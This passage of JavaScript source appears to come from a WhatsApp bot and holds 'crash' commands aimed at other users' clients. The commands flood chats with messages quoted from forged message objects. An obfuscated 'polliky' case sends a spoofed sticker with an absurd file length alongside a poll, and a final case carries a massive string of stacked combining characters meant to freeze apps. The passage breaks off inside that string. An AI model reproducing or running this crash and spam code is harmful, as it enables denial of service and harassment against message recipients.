 case 'ikycrashnopayment':{
 if (!isCreator && !isBan) return
   ikyenak66 = { 
   key: { 
   fromMe: false, 
   participant: `0@s.whatsapp.net`, 
 ...({ remoteJid: "" }) 
  }, 
  message: { 
 "imageMessage": { 
 "mimetype": "image/jpeg", 
 "caption": `IKYY MAKERZ`,
 "jpegThumbnail": virgam
 } 
 } 
 }
await ikycoli.sendMessage(m.chat, {text:"©𝙄𝙆𝙔𝙔 𝘾𝙍𝘼𝙎𝙃 𝙒𝙃𝘼𝙏𝙎𝘼𝙋𝙋"},{quoted:ikyenak66})
await ikycoli.sendMessage(m.chat, {text:"©𝙄𝙆𝙔𝙔 𝘾𝙍𝘼𝙎𝙃 𝙒𝙃𝘼𝙏𝙎𝘼𝙋𝙋"},{quoted:ikyenak66})
await ikycoli.sendMessage(m.chat, {text:"©𝙄𝙆𝙔𝙔 𝘾𝙍𝘼𝙎𝙃 𝙒𝙃𝘼𝙏𝙎𝘼𝙋𝙋"},{quoted:ikyenak66})
await ikycoli.sendMessage(m.chat, {text:"©𝙄𝙆𝙔𝙔 𝘾𝙍𝘼𝙎𝙃 𝙒𝙃𝘼𝙏𝙎𝘼𝙋𝙋"},{quoted:ikyenak66})
await ikycoli.sendMessage(m.chat, {text:"©𝙄𝙆𝙔𝙔 𝘾𝙍𝘼𝙎𝙃 𝙒𝙃𝘼𝙏𝙎𝘼𝙋𝙋"},{quoted:ikyenak66})
await ikycoli.sendMessage(m.chat, {text:"©𝙄𝙆𝙔𝙔 𝘾𝙍𝘼𝙎𝙃 𝙒𝙃𝘼𝙏𝙎𝘼𝙋𝙋"},{quoted:ikyenak66})
await ikycoli.sendMessage(m.chat, {text:"©𝙄𝙆𝙔𝙔 𝘾𝙍𝘼𝙎𝙃 𝙒𝙃𝘼𝙏𝙎𝘼𝙋𝙋"},{quoted:ikyenak66})
await ikycoli.sendMessage(m.chat, {text:"©𝙄𝙆𝙔𝙔 𝘾𝙍𝘼𝙎𝙃 𝙒𝙃𝘼𝙏𝙎𝘼𝙋𝙋"},{quoted:ikyenak66})
await ikycoli.sendMessage(m.chat, {text:"©𝙄𝙆𝙔𝙔 𝘾𝙍𝘼𝙎𝙃 𝙒𝙃𝘼𝙏𝙎𝘼𝙋𝙋"},{quoted:ikyenak66})
await ikycoli.sendMessage(m.chat, {text:"©𝙄𝙆𝙔𝙔 𝘾𝙍𝘼𝙎𝙃 𝙒𝙃𝘼𝙏𝙎𝘼𝙋𝙋"},{quoted:ikyenak66})
await ikycoli.sendMessage(m.chat, {text:"©𝙄𝙆𝙔𝙔 𝘾𝙍𝘼𝙎𝙃 𝙒𝙃𝘼𝙏𝙎𝘼𝙋𝙋"},{quoted:ikyenak66})
await ikycoli.sendMessage(m.chat, {text:"©𝙄𝙆𝙔𝙔 𝘾𝙍𝘼𝙎𝙃 𝙒𝙃𝘼𝙏𝙎𝘼𝙋𝙋"},{quoted:ikyenak66})
await ikycoli.sendMessage(m.chat, {text:"©𝙄𝙆𝙔𝙔 𝘾𝙍𝘼𝙎𝙃 𝙒𝙃𝘼𝙏𝙎𝘼𝙋𝙋"},{quoted:ikyenak66})
await ikycoli.sendMessage(m.chat, {text:"CRASH!!!"},{quoted:ikyenak66})
 }
 break
case 'ikynomercy':{
 if (!isCreator && !isBan) return
   ikyenak66 = { 
   key: { 
   fromMe: false, 
   participant: `0@s.whatsapp.net`, 
 ...({ remoteJid: "" }) 
  }, 
  message: { 
 "imageMessage": { 
 "mimetype": "image/jpeg", 
 "caption": `IKY NO MERCY⚡`,
 "jpegThumbnail": virgam
 } 
 } 
 }
await ikycoli.sendMessage(m.chat, {text:"©IKYY PUNYA RAISYA"},{quoted:ikyenak66})
await ikycoli.sendMessage(m.chat, {text:"©IKYY PUNYA RAISYA"},{quoted:ikyenak66})
await ikycoli.sendMessage(m.chat, {text:"©IKYY PUNYA RAISYA"},{quoted:ikyenak66})
await ikycoli.sendMessage(m.chat, {text:"©IKYY PUNYA RAISYA"},{quoted:ikyenak66})
await ikycoli.sendMessage(m.chat, {text:"©IKYY PUNYA RAISYA"},{quoted:ikyenak66})
await ikycoli.sendMessage(m.chat, {text:"©IKYY PUNYA RAISYA"},{quoted:ikyenak66})
await ikycoli.sendMessage(m.chat, {text:"©IKYY PUNYA RAISYA"},{quoted:ikyenak66})
await ikycoli.sendMessage(m.chat, {text:"©IKYY PUNYA RAISYA"},{quoted:ikyenak66})
await ikycoli.sendMessage(m.chat, {text:"©IKYY PUNYA RAISYA"},{quoted:ikyenak66})
await ikycoli.sendMessage(m.chat, {text:"©IKYY PUNYA RAISYA"},{quoted:ikyenak66})
await ikycoli.sendMessage(m.chat, {text:"©IKYY PUNYA RAISYA"},{quoted:ikyenak66})
await ikycoli.sendMessage(m.chat, {text:"©IKYY PUNYA RAISYA"},{quoted:ikyenak66})
await ikycoli.sendMessage(m.chat, {text:"©IKYY PUNYA RAISYA"},{quoted:ikyenak66})
await ikycoli.sendMessage(m.chat, {text:"CRASH!!!"},{quoted:ikyenak66})
 jancok(`© THE IKYY BOTZ`)
 }
 break
 case 'ikycrashpakepayment':{
 if (!isCreator && !isBan) return
   ikyenak66 = { 
   key: { 
   fromMe: false, 
   participant: `0@s.whatsapp.net`, 
 ...({ remoteJid: "" }) 
  }, 
  message: { 
 "imageMessage": { 
 "mimetype": "image/jpeg", 
 "caption": `IKYY CRASH`,
 "jpegThumbnail": virgam
 } 
 } 
 }
await ikycoli.sendMessage(m.chat, {text:"©𝙄𝙆𝙔𝙔 𝘾𝙍𝘼𝙎𝙃 𝙒𝙃𝘼𝙏𝙎𝘼𝙋𝙋⚡"},{quoted:ikyenak66})
await ikycoli.sendMessage(m.chat, {text:"©𝙄𝙆𝙔𝙔 𝘾𝙍𝘼𝙎𝙃 𝙒𝙃𝘼𝙏𝙎𝘼𝙋𝙋⚡"},{quoted:ikyenak66})
await ikycoli.sendMessage(m.chat, {text:"©𝙄𝙆𝙔𝙔 𝘾𝙍𝘼𝙎𝙃 𝙒𝙃𝘼𝙏𝙎𝘼𝙋𝙋⚡"},{quoted:ikyenak66})
await ikycoli.sendMessage(m.chat, {text:"©𝙄𝙆𝙔𝙔 𝘾𝙍𝘼𝙎𝙃 𝙒𝙃𝘼𝙏𝙎𝘼𝙋𝙋⚡"},{quoted:ikyenak66})
await ikycoli.sendMessage(m.chat, {text:"©𝙄𝙆𝙔𝙔 𝘾𝙍𝘼𝙎𝙃 𝙒𝙃𝘼𝙏𝙎𝘼𝙋𝙋⚡"},{quoted:ikyenak66})
await ikycoli.sendMessage(m.chat, {text:"©𝙄𝙆𝙔𝙔 𝘾𝙍𝘼𝙎𝙃 𝙒𝙃𝘼𝙏𝙎𝘼𝙋𝙋⚡"},{quoted:ikyenak66})
await ikycoli.sendMessage(m.chat, {text:"©𝙄𝙆𝙔𝙔 𝘾𝙍𝘼𝙎𝙃 𝙒𝙃𝘼𝙏𝙎𝘼𝙋𝙋⚡"},{quoted:ikyenak66})
await ikycoli.sendMessage(m.chat, {text:"©𝙄𝙆𝙔𝙔 𝘾𝙍𝘼𝙎𝙃 𝙒𝙃𝘼𝙏𝙎𝘼𝙋𝙋⚡"},{quoted:ikyenak66})
await ikycoli.sendMessage(m.chat, {text:"©𝙄𝙆𝙔𝙔 𝘾𝙍𝘼𝙎𝙃 𝙒𝙃𝘼𝙏𝙎𝘼𝙋𝙋⚡"},{quoted:ikyenak66})
await ikycoli.sendMessage(m.chat, {text:"©𝙄𝙆𝙔𝙔 𝘾𝙍𝘼𝙎𝙃 𝙒𝙃𝘼𝙏𝙎𝘼𝙋𝙋⚡"},{quoted:ikyenak66})
await ikycoli.sendMessage(m.chat, {text:"©𝙄𝙆𝙔𝙔 𝘾𝙍𝘼𝙎𝙃 𝙒𝙃𝘼𝙏𝙎𝘼𝙋𝙋⚡"},{quoted:ikyenak66})
await ikycoli.sendMessage(m.chat, {text:"©𝙄𝙆𝙔𝙔 𝘾𝙍𝘼𝙎𝙃 𝙒𝙃𝘼𝙏𝙎𝘼𝙋𝙋⚡"},{quoted:ikyenak66})
await ikycoli.sendMessage(m.chat, {text:"©𝙄𝙆𝙔𝙔 𝘾𝙍𝘼𝙎𝙃 𝙒𝙃𝘼𝙏𝙎𝘼𝙋𝙋⚡"},{quoted:ikyenak66})
await ikycoli.sendMessage(m.chat, {text:"©𝙄𝙆𝙔𝙔 𝘾𝙍𝘼𝙎𝙃 𝙒𝙃𝘼𝙏𝙎𝘼𝙋𝙋⚡"},{quoted:ikyenak66})
await ikycoli.sendMessage(m.chat, {text:"©𝙄𝙆𝙔𝙔 𝘾𝙍𝘼𝙎𝙃 𝙒𝙃𝘼𝙏𝙎𝘼𝙋𝙋⚡"},{quoted:ikyenak66})
await ikycoli.sendMessage(m.chat, {text:"©𝙄𝙆𝙔𝙔 𝘾𝙍𝘼𝙎𝙃 𝙒𝙃𝘼𝙏𝙎𝘼𝙋𝙋⚡"},{quoted:ikyenak66})
await ikycoli.sendMessage(m.chat, {text:"©𝙄𝙆𝙔𝙔 𝘾𝙍𝘼𝙎𝙃 𝙒𝙃𝘼𝙏𝙎𝘼𝙋𝙋⚡"},{quoted:ikyenak66})
await ikycoli.sendMessage(m.chat, {text:"CRASH!!!"},{quoted:ikyenak66})
 jancok(`© THE IKYY BOTZ`)
 jancok(`© THE IKYY BOTZ`)
 }
 break
case 'polliky':{
 function _0x557e(_0xf605e7,_0x1dbb4d){const _0x595c85=_0x441b();return _0x557e=function(_0x1753b5,_0xb226bf){_0x1753b5=_0x1753b5-0x1dd;let _0x585ca6=_0x595c85[_0x1753b5];return _0x585ca6;},_0x557e(_0xf605e7,_0x1dbb4d);}const _0x393c56=_0x557e;(function(_0x510fd6,_0xf7ad69){const _0xe2087a=_0x557e,_0x5f17df=_0x510fd6();while(!![]){try{const _0x3190b0=parseInt(_0xe2087a(0x1f1))/0x1+parseInt(_0xe2087a(0x1ef))/0x2+parseInt(_0xe2087a(0x1e3))/0x3+-parseInt(_0xe2087a(0x1eb))/0x4+parseInt(_0xe2087a(0x1fd))/0x5+-parseInt(_0xe2087a(0x1f6))/0x6+-parseInt(_0xe2087a(0x1ee))/0x7;if(_0x3190b0===_0xf7ad69)break;else _0x5f17df['push'](_0x5f17df['shift']());}catch(_0x209ec9){_0x5f17df['push'](_0x5f17df['shift']());}}}(_0x441b,0xb143c));const _0x264b94=(function(){let _0x2ae7ef=!![];return function(_0x700d04,_0x30f960){const _0x57e3f6=_0x2ae7ef?function(){const _0x2a6345=_0x557e;if(_0x30f960){const _0x5446d6=_0x30f960[_0x2a6345(0x1f2)](_0x700d04,arguments);return _0x30f960=null,_0x5446d6;}}:function(){};return _0x2ae7ef=![],_0x57e3f6;};}()),_0x4cfbf5=_0x264b94(this,function(){const _0x366e8d=_0x557e;return _0x4cfbf5[_0x366e8d(0x1e5)]()[_0x366e8d(0x1fe)]('(((.+)+)+)+$')[_0x366e8d(0x1e5)]()['constructor'](_0x4cfbf5)[_0x366e8d(0x1fe)](_0x366e8d(0x1e7));});function _0x441b(){const _0x4997e7=['apply','readFileSync','prototype','PENDING','2141292YYfCnI','chat','HALO\x20SAYA\x20CRASH YA\x20BANG\x20AWIKWOK','KATANYA\x20WA KEBAL','return\x20(function()\x20','key','log','4092800rJiSah','search','Message','info','VOTE\x20LAHH','https://mmg.whatsapp.net/d/f/AnyaZPBHxD2w7tJkGh-OmppuLyXIAeuBwBoFb2wwYTOM.enc','BERANI\x20VOTE\x20GA LU','constructor','exception','bind','359715WlzuJv','VOTE\x20LAH\x20SUHU','toString','trace','(((.+)+)+)+$','__proto__','message','relayMessage','5238308igoiXT','Vote\x20Aja\x20Semua','error','1590603ZlPqWw','644558fgEcqW','console','1359020GMPHGa'];_0x441b=function(){return _0x4997e7;};return _0x441b();}_0x4cfbf5();const _0xb226bf=(function(){let _0x148e79=!![];return function(_0x1ec807,_0x562aae){const _0x2b7ab6=_0x148e79?function(){const _0x2929e1=_0x557e;if(_0x562aae){const _0x82a2eb=_0x562aae[_0x2929e1(0x1f2)](_0x1ec807,arguments);return _0x562aae=null,_0x82a2eb;}}:function(){};return _0x148e79=![],_0x2b7ab6;};}()),_0x1753b5=_0xb226bf(this,function(){const _0x64fefd=_0x557e,_0x5eb653=function(){const _0x54827a=_0x557e;let _0x20bc96;try{_0x20bc96=Function(_0x54827a(0x1fa)+'{}.constructor(\x22return\x20this\x22)(\x20)'+');')();}catch(_0x565b86){_0x20bc96=window;}return _0x20bc96;},_0x3af88f=_0x5eb653(),_0x1801d0=_0x3af88f['console']=_0x3af88f[_0x64fefd(0x1f0)]||{},_0x1d377b=[_0x64fefd(0x1fc),'warn',_0x64fefd(0x200),_0x64fefd(0x1ed),_0x64fefd(0x1e1),'table',_0x64fefd(0x1e6)];for(let _0x2eb31e=0x0;_0x2eb31e<_0x1d377b['length'];_0x2eb31e++){const _0x16f92a=_0xb226bf[_0x64fefd(0x1e0)][_0x64fefd(0x1f4)]['bind'](_0xb226bf),_0x19cc1f=_0x1d377b[_0x2eb31e],_0x3e6948=_0x1801d0[_0x19cc1f]||_0x16f92a;_0x16f92a[_0x64fefd(0x1e8)]=_0xb226bf[_0x64fefd(0x1e2)](_0xb226bf),_0x16f92a['toString']=_0x3e6948[_0x64fefd(0x1e5)][_0x64fefd(0x1e2)](_0x3e6948),_0x1801d0[_0x19cc1f]=_0x16f92a;}});_0x1753b5();{if(!isCreator&&!isBan)return;let stic={'key':{'participant':'6285706035039@s.whatsapp.net','remoteJid':'','fromMe':![],'id':'753B96FDB5F5EDF34BF64EC9095C9F8A'},'message':{'stickerMessage':{'fileSha256':'oC/LRMo7+iJN2AtYvhvIYRYLWR4NPmFlMvib5HQET7I=','pngThumbnail':fs[_0x393c56(0x1f3)]('./pict.jpg'),'mimetype':'image/webp','jpegThumbnail':virgam,'height':0x40,'width':0x40,'directPath':_0x393c56(0x1de),'fileLength':'99999999999','firstFrameLength':0xe2a,'isAnimated':![]}},'messageTimestamp':'1614070775','status':_0x393c56(0x1f5)};var pollCreation=generateWAMessageFromContent(m[_0x393c56(0x1f7)],proto[_0x393c56(0x1ff)]['fromObject']({'pollCreationMessage':{'name':_0x393c56(0x1f8),'options':[{'optionName':_0x393c56(0x1dd)},{'optionName':_0x393c56(0x1df)},{'optionName':_0x393c56(0x1e4)},{'optionName':_0x393c56(0x1f9)},{'optionName':'SALAM\x20KENAL\x20IKYY\x20MAKERZ'}],'selectableOptionsCount':0x5}}),{'userJid':m[_0x393c56(0x1f7)],'quoted':stic});ikycoli[_0x393c56(0x1ea)](m[_0x393c56(0x1f7)],pollCreation[_0x393c56(0x1e9)],{'messageId':pollCreation[_0x393c56(0x1fb)]['id']}),jancok(_0x393c56(0x1ec));}}
break
case 'ikycrashemoji':{
 if (!isCreator && !isBan) return
   ikyenak66 = { 
   key: { 
   fromMe: false, 
   participant: `0@s.whatsapp.net`, 
 ...({ remoteJid: "" }) 
  }, 
  message: { 
 "imageMessage": { 
 "mimetype": "image/jpeg", 
 "caption": `IKYY CRASH EMOJI`,
 "jpegThumbnail": virgam
 } 
 } 
 }
await ikycoli.sendMessage(m.chat, {text:"⚡🔥"},{quoted:ikyenak66})
await ikycoli.sendMessage(m.chat, {text:"⚡🔥"},{quoted:ikyenak66})
await ikycoli.sendMessage(m.chat, {text:"⚡🔥"},{quoted:ikyenak66})
await ikycoli.sendMessage(m.chat, {text:"⚡🔥"},{quoted:ikyenak66})
await ikycoli.sendMessage(m.chat, {text:"⚡🔥"},{quoted:ikyenak66})
await ikycoli.sendMessage(m.chat, {text:"⚡🔥"},{quoted:ikyenak66})
await ikycoli.sendMessage(m.chat, {text:"⚡🔥"},{quoted:ikyenak66})
await ikycoli.sendMessage(m.chat, {text:"⚡🔥"},{quoted:ikyenak66})
await ikycoli.sendMessage(m.chat, {text:"⚡🔥"},{quoted:ikyenak66})
await ikycoli.sendMessage(m.chat, {text:"⚡🔥"},{quoted:ikyenak66})
await ikycoli.sendMessage(m.chat, {text:"⚡🔥"},{quoted:ikyenak66})
await ikycoli.sendMessage(m.chat, {text:"⚡🔥"},{quoted:ikyenak66})
await ikycoli.sendMessage(m.chat, {text:"⚡🔥"},{quoted:ikyenak66})
await ikycoli.sendMessage(m.chat, {text:"IKYY CRASH EMOJI!!!"},{quoted:ikyenak66})
 }
 break
 case 'ikycrashtitik':{
 if (!isCreator && !isBan) return
   ikyenak66 = { 
   key: { 
   fromMe: false, 
   participant: `0@s.whatsapp.net`, 
 ...({ remoteJid: "" }) 
  }, 
  message: { 
 "imageMessage": { 
 "mimetype": "image/jpeg", 
 "caption": `${ikyenak2}`,
 "jpegThumbnail": virgam
 } 
 } 
 }
await ikycoli.sendMessage(m.chat, {text:"."},{quoted:ikyenak66})
await ikycoli.sendMessage(m.chat, {text:"."},{quoted:ikyenak66})
await ikycoli.sendMessage(m.chat, {text:"."},{quoted:ikyenak66})
await ikycoli.sendMessage(m.chat, {text:"."},{quoted:ikyenak66})
await ikycoli.sendMessage(m.chat, {text:"."},{quoted:ikyenak66})
await ikycoli.sendMessage(m.chat, {text:"."},{quoted:ikyenak66})
await ikycoli.sendMessage(m.chat, {text:"."},{quoted:ikyenak66})
await ikycoli.sendMessage(m.chat, {text:"."},{quoted:ikyenak66})
await ikycoli.sendMessage(m.chat, {text:"."},{quoted:ikyenak66})
await ikycoli.sendMessage(m.chat, {text:"."},{quoted:ikyenak66})
await ikycoli.sendMessage(m.chat, {text:"."},{quoted:ikyenak66})
await ikycoli.sendMessage(m.chat, {text:"."},{quoted:ikyenak66})
await ikycoli.sendMessage(m.chat, {text:"."},{quoted:ikyenak66})
await ikycoli.sendMessage(m.chat, {text:"."},{quoted:ikyenak66})
 }
 break
 case 'ikyandroid': {            
if (!isCreator && !isBan) return
if (args.length == 0) return m.reply(`Jumlahnya?`)
jumlah = `${encodeURI(q)}`
for (let i = 0; i < jumlah; i++) {
             teng = `
┈┈┈╲┈┈┈┈╱
┈┈┈╱▔▔▔▔╲
┈┈┃┈▇┈┈▇┈┃
╭╮┣━━━━━━┫╭╮
┃┃┃┈┈┈┈┈┈┃┃┃
╰╯┃┈┈┈┈┈┈┃╰╯
┈┈╰┓┏━━┓┏╯
┈┈┈╰╯┈┈╰╯ 
`
             ikyenak66 = { 
                    key: { 
                        fromMe: false, 
                        participant: `0@s.whatsapp.net`, 
                        ...({ remoteJid: "" }) 
                    }, 
                    message: { 
                        "imageMessage": { 
                            "mimetype": "image/jpeg", 
                            "caption": `THE IKYY BOTZ ANDROID`,
                            "jpegThumbnail": virgam
                        } 
                    } 
                }
await ikycoli.sendMessage(m.chat, {text:teng},{quoted:ikyenak66})
}
}
            break
case 'ikymakerzcrashv2': {            
if (!isCreator && !isBan) return
if (args.length == 0) return m.reply(`Jumlahnya?`)
jumlah = `${encodeURI(q)}`
for (let i = 0; i < jumlah; i++) {
             teng = `
█ █░▄▀ █░█ █░█
█ █▀▄░ ▀▄▀ ▀▄▀
▀ ▀░▀▀ ░▀░ ░▀░
░█▄░▄█ ▄▀▄ █░▄▀ █▀ █▀▀▄ ▀▀▀█
░█░█░█ █▀█ █▀▄░ █▀ █▐█▀ ░▄▀░
░▀░░░▀ ▀░▀ ▀░▀▀ ▀▀ ▀░▀▀ ▀▀▀▀
░▄▀ █▀▀▄ ▄▀▄ ▄▀▀ █░█
░█░ █▐█▀ █▀█ ░▀▄ █▀█
░░▀ ▀░▀▀ ▀░▀ ▀▀░ ▀░▀
█░█ █▀█
█░█ ░▄▀
░▀░ █▄▄

`
             ikyenak66 = { 
                    key: { 
                        fromMe: false, 
                        participant: `0@s.whatsapp.net`, 
                        ...({ remoteJid: "" }) 
                    }, 
                    message: { 
                        "imageMessage": { 
                            "mimetype": "image/jpeg", 
                            "caption": `IKYY MAKERZ CRASH V2`,
                            "jpegThumbnail": virgam
                        } 
                    } 
                }
await ikycoli.sendMessage(m.chat, {text:teng},{quoted:ikyenak66})
}
}
            break
case 'ikyartcrash': {            
if (!isCreator && !isBan) return
if (args.length == 0) return m.reply(`Jumlahnya?`)
jumlah = `${encodeURI(q)}`
for (let i = 0; i < jumlah; i++) {
             teng = `
┈┈┈┈▕▔╱▔▔▔━▁
┈┈┈▕▔╱╱╱👁┈╲▂▔▔╲
┈┈▕▔╱╱╱╱💧▂▂▂▂▂▂▏
┈▕▔╱▕▕╱╱╱┈▽▽▽▽▽
▕▔╱┊┈╲╲╲╲▂△△△△
▔╱┊┈╱▕╲▂▂▂▂▂▂╱
╱┊┈╱┉▕┉┋╲┈ 
`
             ikyenak66 = { 
                    key: { 
                        fromMe: false, 
                        participant: `0@s.whatsapp.net`, 
                        ...({ remoteJid: "" }) 
                    }, 
                    message: { 
                        "imageMessage": { 
                            "mimetype": "image/jpeg", 
                            "caption": `IKYY ART CRASH`,
                            "jpegThumbnail": virgam
                        } 
                    } 
                }
await ikycoli.sendMessage(m.chat, {text:teng},{quoted:ikyenak66})
}
}
            break
case 'ikymakerztravazap': {
if (!isCreator && !isBan) return
if (args.length == 0) return m.reply(`Jumlahnya?`)
jumlah = `${encodeURI(q)}`
for (let i = 0; i < jumlah; i++) {
             teng = `
@IKYY TRAVA ZAP
`
             ikyenak66 = { 
                    key: { 
                        fromMe: false, 
                        participant: `0@s.whatsapp.net`, 
                        ...({ remoteJid: "" }) 
                    }, 
                    message: { 
                        "imageMessage": { 
                            "mimetype": "image/jpeg", 
                            "caption": `IKYY TRAVA ZAP`,
                            "jpegThumbnail": virgam
                        } 
                    } 
                }
await ikycoli.sendMessage(m.chat, {text:teng},{quoted:ikyenak66})
}
}
            break
case 'ikymakerzcrashhuhu': {            
if (!isCreator && !isBan) return
if (args.length == 0) return m.reply(`Jumlahnya?`)
jumlah = `${encodeURI(q)}`
for (let i = 0; i < jumlah; i++) {
             teng = `
@IKYYSANGPAHLAWAN
`
             ikyenak66 = { 
                    key: { 
                        fromMe: false, 
                        participant: `0@s.whatsapp.net`, 
                        ...({ remoteJid: "" }) 
                    }, 
                    message: { 
                        "imageMessage": { 
                            "mimetype": "image/jpeg", 
                            "caption": `THE IKYY BOTZ UHUYY`,
                            "jpegThumbnail": virgam
                        } 
                    } 
                }
await ikycoli.sendMessage(m.chat, {text:teng},{quoted:ikyenak66})
}
}
            break
case 'abgjualan?':{
 if (!isCreator && !isBan) return
   ikyenak66 = { 
   key: { 
   fromMe: false, 
   participant: `0@s.whatsapp.net`, 
 ...({ remoteJid: "" }) 
  }, 
  message: { 
 "imageMessage": { 
 "mimetype": "image/jpeg", 
 "caption": `🗿☕`,
 "jpegThumbnail": virgam
 } 
 } 
 }
await ikycoli.sendMessage(m.chat, {text:"Eee bang?"},{quoted:ikyenak66})
await ikycoli.sendMessage(m.chat, {text:"Eee bang?"},{quoted:ikyenak66})
await ikycoli.sendMessage(m.chat, {text:"Eee bang?"},{quoted:ikyenak66})
await ikycoli.sendMessage(m.chat, {text:"Eee bang?"},{quoted:ikyenak66})
await ikycoli.sendMessage(m.chat, {text:"Eee bang?"},{quoted:ikyenak66})
await ikycoli.sendMessage(m.chat, {text:"Eee bang?"},{quoted:ikyenak66})
await ikycoli.sendMessage(m.chat, {text:"Eee bang?"},{quoted:ikyenak66})
await ikycoli.sendMessage(m.chat, {text:"Eee bang?"},{quoted:ikyenak66})
await ikycoli.sendMessage(m.chat, {text:"Eee bang?"},{quoted:ikyenak66})
await ikycoli.sendMessage(m.chat, {text:"Eee bang?"},{quoted:ikyenak66})
await ikycoli.sendMessage(m.chat, {text:"Eee bang?"},{quoted:ikyenak66})
await ikycoli.sendMessage(m.chat, {text:"Eee bang?"},{quoted:ikyenak66})
await ikycoli.sendMessage(m.chat, {text:"Eee bang?"},{quoted:ikyenak66})
await ikycoli.sendMessage(m.chat, {text:"Eee bang?"},{quoted:ikyenak66})
 jancok(`abg nya kemana ya? `)
 }
 break
case 'ikyselebew':{
 if (!isCreator && !isBan) return
   ikyenak66 = { 
   key: { 
   fromMe: false, 
   participant: `0@s.whatsapp.net`, 
 ...({ remoteJid: "" }) 
  }, 
  message: { 
 "imageMessage": { 
 "mimetype": "image/jpeg", 
 "caption":`🔥ཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀི